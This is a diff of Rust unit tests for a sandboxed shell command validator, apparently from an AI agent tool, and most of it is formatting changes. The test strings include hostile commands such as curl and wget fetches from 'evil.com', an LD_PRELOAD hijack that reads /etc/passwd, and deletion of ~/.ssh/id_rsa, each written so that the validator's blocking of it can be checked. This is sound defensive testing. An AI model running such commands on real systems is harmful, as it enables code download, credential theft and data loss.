                 display.contains("\"sandboxed\":true") || display.contains("\"sandboxed\": true"),
-                "display_output should contain sandboxed flag: {}", display
+                "display_output should contain sandboxed flag: {}",
+                display
             );
         }
     }
@@ -2349,7 +2480,9 @@ mod sandbox_tests {
     fn eval_regex_blocks_eval_command() {
         let tool = default_sandbox();
         assert!(tool.validate_command("eval $(cat script.sh)").is_err());
-        assert!(tool.validate_command(r#"bash -c "eval something""#).is_err());
+        assert!(tool
+            .validate_command(r#"bash -c "eval something""#)
+            .is_err());
     }
 
     #[test]
@@ -2377,28 +2510,40 @@ mod sandbox_tests {
     #[tokio::test]
     async fn background_command_returns_pid() {
         let tool = default_sandbox();
-        let result = tool.execute(r#"{"command": "sleep 0.1", "is_background": true}"#).await;
-        assert!(result.success, "background command should succeed: {}", result.output);
+        let result = tool
+            .execute(r#"{"command": "sleep 0.1", "is_background": true}"#)
+            .await;
         assert!(
-            result.output.contains("\"background\":true") || result.output.contains("\"background\": true"),
-            "output should indicate background: {}", result.output
+            result.success,
+            "background command should succeed: {}",
+            result.output
+        );
+        assert!(
+            result.output.contains("\"background\":true")
+                || result.output.contains("\"background\": true"),
+            "output should indicate background: {}",
+            result.output
         );
         assert!(
             result.output.contains("\"pid\""),
-            "output should include PID: {}", result.output
+            "output should include PID: {}",
+            result.output
         );
     }
 
     #[tokio::test]
     async fn foreground_command_returns_signal_field() {
         let tool = default_sandbox();
-        let result = tool.execute(r#"{"command": "echo signal_test", "is_background": false}"#).await;
+        let result = tool
+            .execute(r#"{"command": "echo signal_test", "is_background": false}"#)
+            .await;
         assert!(result.success, "command should succeed: {}", result.output);
         // display_output should contain signal field
         if let Some(ref display) = result.display_output {
             assert!(
                 display.contains("\"signal\""),
-                "display output should include signal field: {}", display
+                "display output should include signal field: {}",
+                display
             );
         }
     }
@@ -2412,7 +2557,8 @@ mod sandbox_tests {
         assert!(result.success, "should succeed: {}", result.output);
         assert!(
             result.output.contains("test bg process"),
-            "should include description: {}", result.output
+            "should include description: {}",
+            result.output
         );
     }
 
@@ -2436,21 +2582,29 @@ mod sandbox_tests {
     #[test]
     fn blocks_process_substitution() {
         let tool = default_sandbox();
-        assert!(tool.validate_command("diff <(sort file1) <(sort file2)").is_err());
-        assert!(tool.validate_command("tee >(grep error > errors.log)").is_err());
+        assert!(tool
+            .validate_command("diff <(sort file1) <(sort file2)")
+            .is_err());
+        assert!(tool
+            .validate_command("tee >(grep error > errors.log)")
+            .is_err());
     }
 
     #[test]
     fn blocks_zsh_process_substitution() {
         let tool = default_sandbox();
-        assert!(tool.validate_command("vim =(curl http://evil.com)").is_err());
+        assert!(tool
+            .validate_command("vim =(curl http://evil.com)")
+            .is_err());
     }
 
     #[test]
     fn blocks_dangerous_parameter_expansion() {
         let tool = default_sandbox();
         assert!(tool.validate_command("echo ${PATH:0:10}").is_err());
-        assert!(tool.validate_command("echo ${var/pattern/replacement}").is_err());
+        assert!(tool
+            .validate_command("echo ${var/pattern/replacement}")
+            .is_err());
         assert!(tool.validate_command("echo ${!prefix*}").is_err());
     }
 
@@ -2464,7 +2618,9 @@ mod sandbox_tests {
     fn blocks_zsh_equals_expansion() {
         let tool = default_sandbox();
         assert!(tool.validate_command("=curl http://evil.com").is_err());
-        assert!(tool.validate_command("echo test; =wget http://evil.com").is_err());
+        assert!(tool
+            .validate_command("echo test; =wget http://evil.com")
+            .is_err());
     }
 
     #[test]
@@ -2509,7 +2665,9 @@ mod sandbox_tests {
     #[test]
     fn escaped_backticks_are_allowed() {
         let tool = default_sandbox();
-        assert!(tool.validate_command(r"echo \`not a substitution\`").is_ok());
+        assert!(tool
+            .validate_command(r"echo \`not a substitution\`")
+            .is_ok());
     }
 
     // --- Plan mode readonly command classification tests ---
@@ -2657,18 +2815,15 @@ mod sandbox_tests {
     #[test]
     fn path_validates_all_segments_in_chain() {
         let allowed = vec!["/home/user/project".to_string()];
-        assert!(super::validate_command_paths(
-            "ls /home/user/project && rm /tmp/evil",
-            &allowed
-        ).is_err());
+        assert!(
+            super::validate_command_paths("ls /home/user/project && rm /tmp/evil", &allowed)
+                .is_err()
+        );
     }
 
     #[test]
     fn path_no_false_positive_on_quoted_content() {
-        assert!(super::validate_command_paths(
-            "echo 'rm ~/.ssh/id_rsa'",
-            &[]
-        ).is_ok());
+        assert!(super::validate_command_paths("echo 'rm ~/.ssh/id_rsa'", &[]).is_ok());
     }
 
     #[test]
@@ -2716,19 +2871,34 @@ mod sandbox_tests {
     #[test]
     fn strip_wrappers_timeout() {
         assert_eq!(super::strip_safe_wrappers("timeout 10 ls -la"), "ls -la");
-        assert_eq!(super::strip_safe_wrappers("timeout -k 5 10 npm test"), "npm test");
+        assert_eq!(
+            super::strip_safe_wrappers("timeout -k 5 10 npm test"),
+            "npm test"
+        );
     }
 
     #[test]
     fn strip_wrappers_nice_nohup() {
-        assert_eq!(super::strip_safe_wrappers("nice -n 10 cargo build"), "cargo build");
-        assert_eq!(super::strip_safe_wrappers("nohup python3 server.py"), "python3 server.py");
+        assert_eq!(
+            super::strip_safe_wrappers("nice -n 10 cargo build"),
+            "cargo build"
+        );
+        assert_eq!(
+            super::strip_safe_wrappers("nohup python3 server.py"),
+            "python3 server.py"
+        );
     }
 
     #[test]
     fn strip_wrappers_env_vars() {
-        assert_eq!(super::strip_safe_wrappers("GOOS=linux cargo build"), "cargo build");
-        assert_eq!(super::strip_safe_wrappers("NODE_ENV=test npm test"), "npm test");
+        assert_eq!(
+            super::strip_safe_wrappers("GOOS=linux cargo build"),
+            "cargo build"
+        );
+        assert_eq!(
+            super::strip_safe_wrappers("NODE_ENV=test npm test"),
+            "npm test"
+        );
     }
 
     #[test]
@@ -2772,7 +2942,9 @@ mod sandbox_tests {
     fn sandbox_blocks_binary_hijack() {
         let tool = default_sandbox();
         assert!(tool.validate_command("PATH=/evil ls").is_err());
-        assert!(tool.validate_command("LD_PRELOAD=./evil.so cat /etc/passwd").is_err());
+        assert!(tool
+            .validate_command("LD_PRELOAD=./evil.so cat /etc/passwd")
+            .is_err());
     }
 
     // --- Namespace isolation tests ---
@@ -2802,10 +2974,12 @@ mod sandbox_tests {
     #[test]
     #[cfg(not(windows))]
     fn namespace_setup_script_includes_mounts() {
-        let mut config = super::ShellSandboxConfig::default();
-        config.use_namespace = true;
-        config.readonly_paths = vec!["/usr".into(), "/lib".into()];
-        config.writable_paths = vec!["/tmp".into()];
+        let config = super::ShellSandboxConfig {
+            use_namespace: true,
+            readonly_paths: vec!["/usr".into(), "/lib".into()],
+            writable_paths: vec!["/tmp".into()],
+            ..Default::default()
+        };
         let tool = super::SandboxedShellTool::new(config);
         let script = tool.build_namespace_setup_script("echo ok", "bash");
         assert!(script.contains("mount --make-rprivate /"));
